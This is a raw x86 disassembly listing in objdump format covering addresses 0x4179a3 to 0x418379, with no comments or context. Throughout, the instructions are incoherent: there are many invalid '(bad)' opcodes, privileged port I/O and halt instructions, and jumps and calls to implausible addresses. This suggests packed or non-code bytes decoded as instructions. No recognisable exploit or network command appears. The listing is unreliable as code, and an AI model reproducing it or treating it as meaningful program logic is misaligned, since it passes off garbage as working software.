  4179a3:	mov    edi,0x29e295c
  4179a8:	hlt    
  4179a9:	mov    DWORD PTR [ebx+esi*4+0x4c],esi
  4179ad:	mov    dh,0x6d
  4179af:	sar    DWORD PTR [ecx],0x8b
  4179b2:	sub    ch,BYTE PTR [ebx-0x3f19483a]
  4179b8:	(bad)  
  4179b9:	mov    ecx,ebx
  4179bb:	test   BYTE PTR [eax],al
	...
  4179d5:	adc    BYTE PTR ds:0x89c15a3a,dl
  4179db:	and    al,0xc0
  4179dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4179de:	lods   al,BYTE PTR ds:[esi]
  4179df:	and    DWORD PTR [edx-0x448d47f7],edx
  4179e5:	jnp    0x417a21
  4179e7:	mov    ebx,0xe331f986
  4179ec:	cmc    
  4179ed:	mov    bl,0xab
  4179ef:	adc    DWORD PTR [ebp+0x4672b967],ecx
  4179f5:	add    al,0x4f
  4179f7:	lods   al,BYTE PTR ds:[esi]
  4179f9:	mov    eax,0x75c08eb9
  4179fe:	mov    dh,0xeb
  417a00:	xor    eax,0x61e32af5
  417a05:	mov    edx,0x7703da41
  417a0a:	scas   al,BYTE PTR es:[edi]
  417a0b:	repz inc edi
  417a0d:	jg     0x417a4e
  417a0f:	repnz mov dh,BYTE PTR [edi]
  417a12:	mov    ebp,0x7a03670
  417a17:	sahf   
  417a18:	dec    eax
  417a19:	repz mov ebx,DWORD PTR [edi+ecx*1-0x444347dc]
  417a21:	push   ds
  417a22:	add    eax,0x958c09d1
  417a27:	add    BYTE PTR [ebx-0xa],bh
  417a2a:	add    al,0x89
  417a2c:	cmp    DWORD PTR [edx-0x52],edi
  417a2f:	je     0x417a36
  417a31:	jns    0x417a76
  417a33:	or     BYTE PTR [edx+0x5f],dh
  417a36:	mov    esi,ds
  417a38:	add    DWORD PTR [eax],eax
	...
  417a52:	sub    dh,BYTE PTR [ebx+0x0]
  417a55:	jmp    0xedb63ed5
  417a5a:	cmp    eax,0x8fe81143
  417a5f:	cmp    eax,0x8df7e968
  417a64:	jnp    0x417a5b
  417a66:	jae    0x417ab3
  417a68:	cld    
  417a69:	pop    esp
  417a6a:	cmp    eax,0xcab6e851
  417a6f:	mov    bh,0xfd
  417a71:	arpl   WORD PTR [ebp-0x50d0a2eb],bp
  417a77:	mov    edi,0x53f7f5c2
  417a7c:	mov    ebp,ecx
  417a7e:	test   eax,0x9e625147
  417a83:	adc    al,0x56
  417a85:	bound  esp,QWORD PTR [edi-0x5dfd2150]
  417a8b:	mov    al,BYTE PTR [edx-0x9]
  417a8e:	(bad)  
  417a8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a90:	adc    BYTE PTR [edi],0xf7
  417a93:	repnz push esp
  417a95:	bound  edi,QWORD PTR [esi-0x77d36bf8]
  417a9b:	lods   eax,DWORD PTR ds:[esi]
  417a9c:	out    0x1d,al
  417a9e:	stc    
  417a9f:	add    al,0x66
  417aa1:	push   0x78
  417aa3:	cmc    
  417aa4:	jo     0x417a8b
  417aa6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417aa7:	jbe    0x417a92
  417aa9:	in     al,0x7c
  417aab:	fdiv   QWORD PTR [ebx-0x1c]
  417aae:	cwde   
  417aaf:	pop    ebx
  417ab0:	cld    
  417ab1:	inc    edx
  417ab2:	repnz add ecx,0xfffffffd
	...
  417ace:	add    BYTE PTR [eax+0x600fc5a],al
  417ad4:	retf   
  417ad5:	call   0x42dca0
  417ada:	(bad)  
  417adb:	cmp    BYTE PTR [esi+0xb],dh
  417ade:	mov    bh,0x25
  417ae0:	mov    al,bl
  417ae2:	call   0x3f3e0f
  417ae7:	fadd   st,st(0)
  417ae9:	jle    0x417ac0
  417aeb:	int    0x43
  417aed:	clc    
  417aee:	add    DWORD PTR [eax+0x1a],ebp
  417af1:	xchg   DWORD PTR [ebp+0x45],eax
  417af4:	mov    eax,DWORD PTR [eax]
  417af6:	mov    edx,ebp
  417af8:	xchg   esp,eax
  417af9:	std    
  417afa:	dec    DWORD PTR [ebp+0x4f]
  417afd:	sti    
  417afe:	jne    0x417b21
  417b00:	push   0xffffffb8
  417b02:	jle    0x417b21
  417b04:	add    al,BYTE PTR [eax+eax*8+0x75fb2dc9]
  417b0b:	inc    ebp
  417b0c:	dec    edi
  417b0d:	sti    
  417b0e:	jne    0x417b51
  417b10:	push   0x44
  417b12:	std    
  417b13:	xor    dh,BYTE PTR [edi-0x80]
  417b16:	jge    0x417b4d
  417b18:	add    DWORD PTR [ecx+0x24],esi
  417b1b:	xchg   edi,eax
  417b1c:	aas    
  417b1d:	std    
  417b1e:	sbb    DWORD PTR [ebp-0x6da8e713],0xfffffffc
  417b25:	sti    
  417b26:	(bad)  
  417b27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b28:	push   es
  417b29:	mov    dh,0xc0
  417b2b:	sbb    eax,0xd044694
  417b30:	push   es
  417b31:	mov    dh,0x46
	...
  417b4b:	add    dh,bl
  417b4d:	push   ecx
  417b4e:	xchg   DWORD PTR [ebp-0x3b],eax
  417b51:	jbe    0x417b83
  417b53:	call   0x41aad8
  417b58:	in     eax,dx
  417b59:	add    BYTE PTR [ebx+0x5e],bl
  417b5c:	mov    dh,0xc8
  417b5e:	ret    0x8d04
  417b61:	pop    esp
  417b62:	xchg   esp,ebp
  417b64:	hlt    
  417b65:	sub    al,0xad
  417b67:	lods   al,BYTE PTR ds:[esi]
  417b68:	imul   DWORD PTR [ebx-0x68ddaeff]
  417b6e:	nop
  417b6f:	inc    ebx
  417b70:	test   BYTE PTR [ebx-0x1196eb57],bl
  417b76:	mov    ebp,0x87f7b987
  417b7b:	shl    cl,0xa6
  417b7e:	out    dx,eax
  417b7f:	mov    edi,0x5d64d
  417b84:	hlt    
  417b85:	and    bh,BYTE PTR [eax]
  417b87:	lock jns 0x417b97
  417b8a:	xor    eax,0xa8e57f0e
  417b8f:	mov    dh,0xa9
  417b91:	lods   al,BYTE PTR ds:[esi]
  417b92:	add    DWORD PTR [edi-0x3f77f84f],eax
  417b98:	test   eax,0x1873bea1
  417b9d:	rcr    edx,cl
  417b9f:	push   ebx
  417ba0:	cmc    
  417ba1:	stos   DWORD PTR es:[edi],eax
  417ba2:	test   al,0xda
  417ba4:	ja     0x417bee
  417ba6:	loopne 0x417ba8
  417ba8:	je     0x417bf2
  417baa:	adc    al,0x0
  417bac:	adc    BYTE PTR [esi],0x7f
  417baf:	inc    BYTE PTR [eax]
	...
  417bc9:	cmc    
  417bca:	in     eax,dx
  417bcb:	push   ecx
  417bcc:	mov    DWORD PTR [ecx-0x5d],edi
  417bcf:	mov    ds,WORD PTR [ebp+0xc]
  417bd2:	btc    DWORD PTR [ebx],edx
  417bd5:	or     al,0xb0
  417bd7:	inc    ecx
  417bd8:	add    BYTE PTR [edi+0x9],dh
  417bdb:	mov    esp,0x38947100
  417be0:	xor    DWORD PTR [edi+0x19],edi
  417be3:	mov    al,0x81
  417be5:	mov    bl,0xa2
  417be7:	add    dh,0xf3
  417bea:	pop    ss
  417beb:	sbb    BYTE PTR [esi+0x23],dl
  417bee:	cmp    edx,DWORD PTR ds:0x3de0a58
  417bf4:	xor    DWORD PTR [eax-0x4b790cfb],0x37bcfa39
  417bfe:	lods   eax,DWORD PTR ds:[esi]
  417bff:	bound  eax,QWORD PTR [edi-0x74]
  417c02:	xchg   BYTE PTR ds:0xe7b48bd9,ah
  417c08:	clc    
  417c09:	ss mov ch,0xb9
  417c0c:	fisttp QWORD PTR [ebp+0x6c47620b]
  417c12:	jle    0x417bb8
  417c14:	ffreep st(5)
  417c16:	mov    bl,0xfc
  417c18:	pop    ds
  417c19:	push   es
  417c1a:	inc    ebp
  417c1b:	out    0x88,eax
  417c1d:	out    0xb4,eax
  417c1f:	fcmovu st,st(0)
  417c21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417c22:	sbb    al,0x1b
  417c24:	add    al,0xf4
  417c26:	add    al,0x9a
  417c28:	mov    ?,WORD PTR [edi+0x5d0f7c]
	...
  417c46:	cwde   
  417c47:	add    eax,0x873f0e7
  417c4c:	cmc    
  417c4d:	sti    
  417c4e:	mov    dh,0x14
  417c50:	lods   eax,DWORD PTR ds:[esi]
  417c51:	inc    esi
  417c52:	jnp    0x417c5d
  417c54:	out    dx,al
  417c55:	xchg   esi,eax
  417c56:	xor    al,0x7d
  417c58:	xor    al,0xbd
  417c5a:	jnp    0x417c96
  417c5c:	mov    bh,0x8a
  417c5e:	scas   eax,DWORD PTR es:[edi]
  417c5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417c60:	daa    
  417c61:	or     eax,0x4670cb51
  417c66:	sbb    al,0xf0
  417c68:	test   eax,0xea397a0c
  417c6d:	add    esi,esp
  417c6f:	jg     0x417c9d
  417c71:	loopne 0x417c68
  417c73:	(bad)  
  417c74:	fcmovbe st,st(1)
  417c76:	loope  0x417cb1
  417c78:	xchg   edi,eax
  417c79:	lock xchg ebx,eax
  417c7b:	push   ds
  417c7c:	in     eax,0x25
  417c7e:	jae    0x417cc9
  417c80:	cmp    ebx,DWORD PTR [edx+0x6f]
  417c83:	xor    DWORD PTR ds:0x2a8db0,esi
  417c89:	inc    edx
  417c8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417c8b:	mov    al,0x89
  417c8d:	jnp    0x417c6d
  417c8f:	mov    edx,0x4f7e8d9
  417c94:	add    esp,edx
  417c96:	dec    ebx
  417c97:	mov    edx,DWORD PTR [ebx+0x5d]
  417c9a:	add    BYTE PTR [edx+0x4e],bh
  417c9d:	push   es
  417c9e:	jg     0x417cd7
  417ca0:	aam    0xcf
  417ca2:	jl     0x417c64
  417ca4:	or     eax,0x51164
  417ca9:	jmp    0x417cae
	...
  417cc2:	add    BYTE PTR [ecx],bl
  417cc4:	cld    
  417cc5:	jge    0x417cb7
  417cc7:	clc    
  417cc8:	xchg   DWORD PTR [ecx+ebp*8-0x5b76fb09],ebx
  417ccf:	xchg   ebx,eax
  417cd0:	test   BYTE PTR [ecx+edi*8],bh
  417cd3:	test   DWORD PTR [ecx],0x4f59983
  417cd9:	add    BYTE PTR [edi],ch
  417cdb:	sti    
  417cdc:	adc    al,0xff
  417cde:	imul   esi,DWORD PTR [edx-0xd9fafec],0xffffffb8
  417ce5:	call   0xfdf2f0e9
  417cea:	jb     0x417d2c
  417cec:	xchg   ecx,ebx
  417cee:	push   ebp
  417cef:	int3   
  417cf0:	sti    
  417cf1:	jp     0x417cec
  417cf3:	lds    edx,FWORD PTR [ebx-0x7f]
  417cf6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417cf7:	dec    DWORD PTR [ebx+0x356dd173]
  417cfd:	or     eax,0x73b1e453
  417d02:	rol    DWORD PTR [esi-0x50],0x13
  417d06:	adc    DWORD PTR [esi],eax
  417d08:	inc    ebp
  417d09:	add    BYTE PTR [edx-0x4c],ch
  417d0c:	add    DWORD PTR [ebx+0x450324a9],eax
  417d12:	push   0xe8ffccb6
  417d17:	imul   ebx
  417d19:	jp     0x417d1b
  417d1b:	popf   
  417d1c:	clc    
  417d1d:	fsub   st(3),st
  417d1f:	and    cl,0xfa
  417d22:	fistp  DWORD PTR [esi+eax*1+0x300]
	...
  417d3d:	add    BYTE PTR [eax],al
  417d3f:	add    BYTE PTR [esi],ah
  417d41:	mov    dl,0xf8
  417d43:	jb     0x417d39
  417d45:	add    DWORD PTR [ecx+0x10],0x1d7c6c4
  417d4c:	popf   
  417d4d:	push   es
  417d4e:	inc    edx
  417d50:	sub    BYTE PTR [esi-0x29],bh
  417d53:	add    DWORD PTR [ebp-0x3a17acfa],ecx
  417d59:	push   ebx
  417d5a:	std    
  417d5b:	push   DWORD PTR [esi-0x2e3fcdf6]
  417d61:	enter  0xc74,0x1a
  417d65:	cmp    al,0x10
  417d67:	mov    edx,DWORD PTR [eax+0x17e84f16]
  417d6d:	cmp    bl,0xff
  417d70:	mov    ds,WORD PTR [esi+0x69]
  417d73:	push   esp
  417d74:	dec    esp
  417d75:	push   es
  417d76:	mov    DWORD PTR [ebp+0x41],esi
  417d79:	pop    esi
  417d7a:	repnz sub DWORD PTR [edx],0x6f
  417d7e:	in     eax,0xe1
  417d80:	sbb    al,0x6
  417d82:	add    BYTE PTR [ebx],dh
  417d84:	pop    edi
  417d85:	cmp    DWORD PTR [edi+0x37d8c0f7],0x55
  417d8c:	sub    eax,0xe6662dfb
  417d91:	mov    ebp,0x949840b
  417d96:	add    BYTE PTR [eax],al
  417d98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d99:	or     bl,BYTE PTR [eax+0x66]
  417d9c:	push   esp
  417d9d:	inc    ebp
  417d9e:	mov    ah,0xf
  417da0:	arpl   WORD PTR [eax+ebp*1+0x66],ax
	...
  417dbc:	add    BYTE PTR [esi+0x3c],ah
  417dbf:	and    esp,DWORD PTR [esi-0x74]
  417dc2:	push   0xa6f46608
  417dc7:	les    esp,FWORD PTR [esi+0x7d]
  417dca:	call   0xbf7c0940
  417dcf:	sub    eax,DWORD PTR [esp]
  417dd2:	and    DWORD PTR [eax-0x48],eax
  417dd5:	lahf   
  417dd6:	enter  0x371f,0x2a
  417dda:	jne    0x417de6
  417ddc:	test   BYTE PTR [ecx+0xe00019c],al
  417de2:	mov    ebx,0x607d6659
  417de7:	ins    DWORD PTR es:[edi],dx
  417de8:	or     eax,0x65fb6942
  417ded:	outs   dx,DWORD PTR ds:[esi]
  417dee:	jns    0x417dec
  417df0:	gs mov ch,0x3c
  417df3:	or     DWORD PTR [esi-0x1],esp
  417df6:	fcomp  QWORD PTR [esi]
  417df8:	xchg   DWORD PTR [ecx+0xd468839],esi
  417dfe:	xchg   esi,eax
  417dff:	adc    DWORD PTR [eax+0x69],edx
  417e02:	push   0xb0535075
  417e07:	inc    ebp
  417e08:	push   ss
  417e09:	mov    ah,0x9b
  417e0b:	or     dh,BYTE PTR [ebp-0x3b7a1047]
  417e11:	call   0xb72982ab
  417e16:	mov    eax,0xf9fb0002
  417e1b:	rcl    BYTE PTR [eax+0x71],0x20
  417e1f:	pop    esp
  417e20:	cld    
	...
  417e39:	add    BYTE PTR [ebx],bl
  417e3b:	shr    BYTE PTR [eax+ebp*8-0x76fe6320],cl
  417e42:	mov    cl,0xa3
  417e44:	mov    eax,0x6f97130
  417e49:	push   0xfffffff7
  417e4b:	out    0x84,al
  417e4d:	mov    ebx,0xfdb77a4c
  417e52:	jge    0x417e65
  417e54:	lods   al,BYTE PTR ds:[esi]
  417e55:	call   0x3158383
  417e5a:	hlt    
  417e5b:	scas   eax,DWORD PTR es:[edi]
  417e5c:	adc    al,0x10
  417e5e:	jg     0x417eaa
  417e60:	pop    ebx
  417e61:	sub    al,0x6c
  417e63:	jmp    0x417e4b
  417e65:	add    ebp,DWORD PTR [ebp-0x40]
  417e68:	(bad)  
  417e69:	into   
  417e6a:	mov    edi,0xb47fe705
  417e6f:	cmp    DWORD PTR [eax+0x2e1927b8],esi
  417e75:	hlt    
  417e76:	es add eax,0xe10e50e7
  417e7c:	mov    esi,0x647d2786
  417e81:	xchg   DWORD PTR [ecx+esi*4],ebp
  417e84:	dec    esi
  417e85:	mov    ecx,0x2e8078c
  417e8a:	hlt    
  417e8b:	mov    BYTE PTR [edi],ah
  417e8d:	xor    BYTE PTR ds:0x7d0fbcb0,cl
  417e93:	inc    edx
  417e94:	fisttp DWORD PTR [ebx+eiz*2-0x43708ba9]
  417e9b:	mov    al,0x1e
  417e9d:	mov    ecx,0x0
	...
  417eb6:	add    BYTE PTR [esi+0x77ffb7af],ah
  417ebc:	(bad)
  417ebf:	cmc    
  417ec0:	add    eax,0x3a6d03e7
  417ec5:	repz add al,0xa7
  417ec8:	test   al,0x67
  417eca:	cli    
  417ecb:	sub    edi,edi
  417ecd:	arpl   ax,dx
  417ecf:	hlt    
  417ed0:	add    al,0xe7
  417ed2:	stos   DWORD PTR es:[edi],eax
  417ed3:	push   eax
  417ed4:	xchg   ebx,eax
  417ed5:	call   0xe706f6dd
  417eda:	jg     0x417f0d
  417edc:	add    eax,0x4a6f03e7
  417ee1:	mov    edi,0xa554f8f4
  417ee6:	add    ebx,esi
  417ee8:	jl     0x417eea
  417eea:	xor    al,0xa4
  417eec:	pushf  
  417eed:	dec    ebp
  417eee:	arpl   WORD PTR [ecx+esi*4-0x2f273e77],bx
  417ef5:	je     0x417f0f
  417ef7:	iret   
  417ef8:	sub    bh,al
  417efa:	pop    ds
  417efb:	push   ss
  417efc:	jle    0x417eef
  417efe:	add    esp,esp
  417f00:	mov    cl,0x73
  417f02:	xchg   ecx,eax
  417f03:	jb     0x417f4b
  417f05:	or     eax,0x58136d19
  417f0a:	fbstp  TBYTE PTR [edi]
  417f0c:	add    eax,0x83fba581
  417f11:	rcr    ch,0xed
  417f14:	dec    ecx
  417f15:	jg     0x417f3e
  417f17:	mov    al,0xaf
  417f19:	std    
  417f1a:	jmp    0x417f1f
	...
  417f33:	add    BYTE PTR [eax-0x622407d6],cl
  417f39:	popf   
  417f3a:	inc    eax
  417f3b:	inc    edi
  417f3c:	xor    eax,0xffbf7ffd
  417f41:	add    eax,0xb21f0776
  417f46:	fld1   
  417f48:	test   DWORD PTR [ecx+eax*1],0x72ac5822
  417f4f:	add    BYTE PTR [ecx+0x3780f843],al
  417f55:	int    0xff
  417f57:	call   0x75028553
  417f5c:	ins    BYTE PTR es:[edi],dx
  417f5d:	int    0xff
  417f5f:	call   0xce29d95b
  417f64:	mov    ebx,0xf902fdaf
  417f69:	repnz mov edi,0x138306d
  417f6f:	fidivr WORD PTR [ebp+0x482c89ac]
  417f75:	push   ebp
  417f76:	call   0xfdf2ed82
  417f7b:	add    dh,bl
  417f7d:	pusha  
  417f7e:	lds    edx,FWORD PTR [edx-0x24]
  417f81:	add    cl,BYTE PTR [ecx+0x4e61a975]
  417f87:	adc    BYTE PTR [edx-0x1a8a788a],0x7d
  417f8e:	jle    0x417fa8
  417f90:	or     dh,BYTE PTR [esi+0x11]
  417f93:	sbb    bh,cl
  417f95:	inc    edx
  417f96:	add    BYTE PTR [edx+0x0],ch
	...
  417fb1:	leave  
  417fb2:	ja     0x418025
  417fb4:	call   0x5645ef07
  417fb9:	xor    dl,BYTE PTR [eax+ebx*2]
  417fbc:	push   ss
  417fbd:	fisttp QWORD PTR [eax]
  417fbf:	jg     0x417f85
  417fc1:	rol    DWORD PTR [ebp-0x235f8a40],0x13
  417fc8:	push   eax
  417fc9:	dec    ebx
  417fca:	ja     0x417fdd
  417fcc:	push   eax
  417fcd:	mov    eax,DWORD PTR [edx+0x0]
  417fd0:	sbb    ecx,0xfffffffc
  417fd3:	push   edx
  417fd4:	call   FWORD PTR [eax+0x5d401216]
  417fda:	jge    0x417f8d
  417fdc:	pop    eax
  417fdd:	and    DWORD PTR [esi-0x5],esi
  417fe0:	call   0x401992
  417fe5:	out    0x4b,al
  417fe7:	loopne 0x41802c
  417fe9:	les    ecx,FWORD PTR [ebx-0x20]
  417fec:	cmp    eax,DWORD PTR [eax-0x7d7df436]
  417ff2:	ins    DWORD PTR es:[edi],dx
  417ff3:	sti    
  417ff4:	jmp    esp
  417ff6:	xchg   ebp,eax
  417ff7:	add    BYTE PTR [eax],al
  417ff9:	sbb    eax,0x6e10417d
  417ffe:	retf   
  417fff:	push   eax
  418000:	mov    DWORD PTR [eax+0x6],esi
  418003:	call   0xfbb82473
  418008:	mov    eax,ebx
  41800a:	adc    al,0x37
  41800c:	ret    
  41800d:	hlt    
  41800e:	dec    edi
  41800f:	dec    ebx
  418010:	aaa    
  418011:	mov    eax,ds:0x3c2bab
	...
  41802e:	imul   eax,DWORD PTR [esi+0x5],0x1051e489
  418035:	mov    esi,DWORD PTR [edx]
  418037:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418038:	dec    esi
  418039:	push   eax
  41803a:	jecxz  0x418014
  41803c:	pop    ecx
  41803d:	push   ss
  41803e:	xor    al,0x9c
  418040:	add    ah,0x0
  418043:	sub    ecx,eax
  418045:	je     0x418041
  418047:	fiadd  DWORD PTR [edx+0x19c9fc6]
  41804d:	add    bh,bh
  41804f:	call   0x92d5f267
  418054:	adc    BYTE PTR [eax+0x7401a42a],al
  41805a:	repz push ds
  41805c:	xor    BYTE PTR [edi+ebp*2],dl
  41805f:	pusha  
  418060:	adc    esi,eax
  418062:	cmp    dh,BYTE PTR [ecx+eax*1-0x49dae018]
  418069:	std    
  41806a:	sbb    eax,0xd
  41806d:	call   0x460a5a
  418072:	cmp    DWORD PTR [eax+0x5],0xb61c85e8
  418079:	std    
  41807a:	outs   dx,DWORD PTR ds:[esi]
  41807b:	pusha  
  41807c:	or     DWORD PTR [ebx-0x2b1fc1d],ecx
  418082:	jmp    0xf481928a
  418087:	and    al,BYTE PTR [eax-0x2c]
  41808a:	into   
  41808b:	mov    bh,0x82
  41808d:	shr    bl,0x8b
  418090:	add    ch,0x0
	...
  4180ab:	clc    
  4180ac:	xchg   esi,eax
  4180ad:	mov    dh,0x13
  4180af:	mov    eax,0x770041cd
  4180b4:	out    0x4,eax
  4180b6:	push   esi
  4180b7:	sbb    eax,DWORD PTR [esp+edi*8]
  4180ba:	pop    ss
  4180bb:	out    0x44,al
  4180bd:	out    0x86,eax
  4180bf:	inc    edi
  4180c0:	dec    esp
  4180c1:	shl    DWORD PTR [ebp-0x4adb39ff],cl
  4180c7:	sti    
  4180c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4180c9:	adc    ebp,ecx
  4180cb:	repnz lods al,BYTE PTR ds:[esi]
  4180cd:	mov    esi,0xaa9dd82f
  4180d2:	push   ebx
  4180d3:	jecxz  0x418081
  4180d5:	scas   al,BYTE PTR es:[edi]
  4180d6:	das    
  4180d7:	rcr    BYTE PTR [ebp-0x532cac9e],1
  4180dd:	jno    0x41811e
  4180df:	leave  
  4180e0:	dec    esp
  4180e1:	xor    eax,0xf7c7bb59
  4180e6:	add    esp,DWORD PTR [edi]
  4180e8:	adc    BYTE PTR [ebx-0x16be5f7d],0x3
  4180ef:	hlt    
  4180f0:	push   edi
  4180f1:	sbb    eax,0xa7726f4d
  4180f6:	mov    bh,0x99
  4180f8:	lods   al,BYTE PTR ds:[esi]
  4180f9:	dec    edi
  4180fa:	popa   
  4180fb:	xchg   ebx,eax
  4180fc:	lods   al,BYTE PTR ds:[esi]
  4180fd:	out    0xf0,eax
  4180ff:	lods   al,BYTE PTR ds:[esi]
  418100:	jp     0x4180ae
  418102:	jae    0x418128
  418104:	jle    0x4180b2
  418106:	mov    bl,0x73
  418108:	dec    edx
  418109:	push   ebx
  41810a:	mov    ecx,edi
  41810c:	mov    al,0x70
  41810e:	push   edi
	...
  418127:	add    BYTE PTR [esi+edi*2-0x6c],ch
  41812b:	mov    bh,0x4c
  41812d:	adc    ah,BYTE PTR [ebp+esi*4+0x59]
  418131:	and    esp,eax
  418133:	push   esi
  418134:	test   BYTE PTR [ecx],dh
  418136:	xlat   BYTE PTR ds:[ebx]
  418137:	xchg   BYTE PTR [edi-0x4879488c],dh
  41813d:	mov    al,0xb7
  41813f:	stos   DWORD PTR es:[edi],eax
  418140:	clc    
  418141:	nop
  418142:	call   0x7406f94a
  418147:	adc    al,0x29
  418149:	xor    al,BYTE PTR [eax]
  41814b:	cmc    
  41814c:	push   0xe701f438
  418151:	adc    al,0x0
  418153:	jmp    0x7135b9a0
  418158:	retf   0xe8b4
  41815b:	cmp    ah,BYTE PTR [edi-0x5d9f0255]
  418161:	mov    al,0x87
  418163:	and    al,0xb0
  418165:	sbb    DWORD PTR [ebx-0x43],0x72
  418169:	xchg   esp,eax
  41816b:	mov    ah,0xa8
  41816d:	test   eax,0xb11a5c50
  418172:	push   eax
  418173:	xchg   ecx,eax
  418174:	(bad)  
  418175:	nop
  418176:	(bad)  
  418177:	call   0xf6b646c7
  41817c:	mov    BYTE PTR [edi],dh
  41817e:	cld    
  41817f:	mov    cs,WORD PTR [edx]
  418181:	mov    cl,0xe8
  418183:	mov    DWORD PTR [edi],0xda7e0005
  418189:	mov    al,0x87
  41818b:	sub    al,0x0
	...
  4181a5:	dec    esp
  4181a6:	pushf  
  4181a7:	and    BYTE PTR [eax],bl
  4181a9:	test   DWORD PTR [edi+eax*4],0x5b8363c4
  4181b0:	popa   
  4181b1:	jle    0x418202
  4181b3:	cld    
  4181b4:	push   esi
  4181b5:	shl    BYTE PTR [eax-0x53d92118],cl
  4181bb:	std    
  4181bc:	rol    DWORD PTR [esi],cl
  4181be:	cmp    BYTE PTR [ebx+0x1d],0xcf
  4181c2:	pushf  
  4181c3:	sbb    al,0x1e
  4181c5:	test   DWORD PTR [ecx+ecx*4],0xc8ed939c
  4181cc:	popa   
  4181cd:	pop    eax
  4181ce:	xor    DWORD PTR [eax-0x17],eax
  4181d1:	lock inc eax
  4181d3:	enter  0xaad0,0xb4
  4181d7:	dec    edi
  4181d8:	fdivp  st(2),st
  4181da:	inc    edi
  4181db:	lock add BYTE PTR [ebp+0x2b3cb170],cl
  4181e2:	ja     0x4181df
  4181e4:	mov    edx,edx
  4181e6:	push   edi
  4181e7:	mov    DWORD PTR [ebp-0xb],eax
  4181ea:	push   esp
  4181eb:	push   eax
  4181ec:	call   0x3e7d9e
  4181f1:	sahf   
  4181f2:	mov    esp,0x70a0ff18
  4181f7:	xchg   eax,esi
  4181f9:	xor    eax,0xdd0150c6
  4181fe:	ja     0x418271
  418200:	in     al,dx
  418201:	lds    edi,FWORD PTR [edi+0x6fcd0150]
  418207:	ficomp WORD PTR [ebx]
	...
  418221:	add    BYTE PTR [ebx-0xfdc2992],ah
  418227:	mov    BYTE PTR [edx+0x6dcee],bh
  41822d:	mov    edx,DWORD PTR [ebx+0x68c08984]
  418233:	jbe    0x418230
  418235:	mov    BYTE PTR [ecx+eax*2+0x5677754a],dl
  41823c:	pop    esi
  41823d:	pop    ebx
  41823e:	push   esp
  41823f:	ret    0x8b51
  418242:	sbb    DWORD PTR [edx+0x651cf8e4],eax
  418248:	pushf  
  418249:	add    BYTE PTR [ebp-0x3b74b0fa],bl
  41824f:	sub    DWORD PTR [edi+0x4],ecx
  418252:	inc    ebx
  418253:	dec    edi
  418254:	adc    edx,0x75fb0db1
  41825a:	dec    ebp
  41825b:	sub    ecx,DWORD PTR [ecx+0x8]
  41825e:	sub    ch,ah
  418260:	or     ebp,DWORD PTR [edx+0x50]
  418263:	ds call 0x429b5f
  418269:	test   BYTE PTR ds:0xf46a77ed,bl
  41826f:	stos   DWORD PTR es:[edi],eax
  418270:	cmp    BYTE PTR [eax+edx*1-0x50],0x49
  418275:	call   0x458cf2
  41827a:	sub    ebp,DWORD PTR [edi]
  41827c:	stc    
  41827d:	mov    ch,BYTE PTR [eax-0x5802f249]
  418283:	lahf   
  418284:	cdq    
  418285:	jb     0x418287
	...
  41829f:	js     0x41823e
  4182a1:	add    DWORD PTR [ecx+0x24853533],ecx
  4182a7:	push   0xc00019c
  4182ac:	sbb    ch,BYTE PTR [edi-0x4ec90c03]
  4182b2:	and    edx,0xffffffef
  4182b5:	pop    ss
  4182b6:	push   esi
  4182b7:	outs   dx,DWORD PTR ds:[esi]
  4182b8:	pop    edx
  4182b9:	push   ecx
  4182ba:	mov    esi,DWORD PTR [eax]
  4182bc:	add    ah,ah
  4182be:	dec    edi
  4182bf:	fsubr  QWORD PTR [esi-0xe340078]
  4182c5:	fwait
  4182c6:	xor    esp,DWORD PTR [ebx*4-0x3fcf74ff]
  4182cd:	or     DWORD PTR [eax-0x4d],edx
  4182d0:	test   al,0x11
  4182d2:	std    
  4182d3:	and    DWORD PTR [eax+0x32ec73b2],ebx
  4182d9:	or     BYTE PTR ss:[edx+ebx*8+0x1793ff03],cl
  4182e1:	shl    DWORD PTR [edx+edi*8+0x1e],0x6d
  4182e6:	and    al,0x54
  4182e8:	fwait
  4182e9:	add    DWORD PTR [eax],eax
  4182eb:	(bad)  
  4182ec:	rol    DWORD PTR ds:0x356f5b1,1
  4182f2:	xor    cl,BYTE PTR [edi+0x18]
  4182f5:	xor    eax,0x5d43fc24
  4182fa:	test   ch,dh
  4182fc:	fwait
  4182fd:	jnp    0x4182c0
  4182ff:	mov    bl,0x4
  418301:	lds    ecx,FWORD PTR [esi+0x0]
	...
  41831c:	jge    0x4182bd
  41831e:	mov    esp,0x7f04f0c5
  418323:	mov    eax,ds:0x1be7a93b
  418328:	pop    esp
  418329:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41832a:	stos   BYTE PTR es:[edi],al
  41832b:	add    eax,edx
  41832d:	test   eax,0x450a3fd4
  418332:	out    0x86,eax
  418334:	xor    al,bh
  418336:	xchg   esp,eax
  418337:	fwait
  418338:	ss push es
  41833a:	out    0x3,eax
  41833c:	jge    0x418300
  41833e:	stos   BYTE PTR es:[edi],al
  41833f:	push   edi
  418340:	ins    DWORD PTR es:[edi],dx
  418341:	cwde   
  418342:	push   0xffffffa0
  418344:	int3   
  418345:	push   ebp
  418346:	ss jno 0x41832b
  418349:	push   es
  41834a:	out    0x3,eax
  41834c:	inc    ecx
  41834d:	sbb    esp,edi
  41834f:	pop    ecx
  418350:	loope  0x418364
  418352:	pop    ss
  418353:	sbb    dh,BYTE PTR [eax*1+0x7a00c86a]
  41835a:	sub    eax,0xdd7e2408
  41835f:	fwait
  418360:	mov    esi,0x6d03e86e
  418365:	inc    edx
  418366:	fistp  QWORD PTR [edx+0x3a]
  418369:	sub    DWORD PTR [edx+ecx*4+0x74],esi
  41836d:	add    eax,0x9d4403e7
  418372:	pop    ds
  418373:	push   eax
  418374:	hlt    
  418375:	add    al,0x1
  418377:	add    al,0x1e
  418379:	fnsave [ebx+0x47]
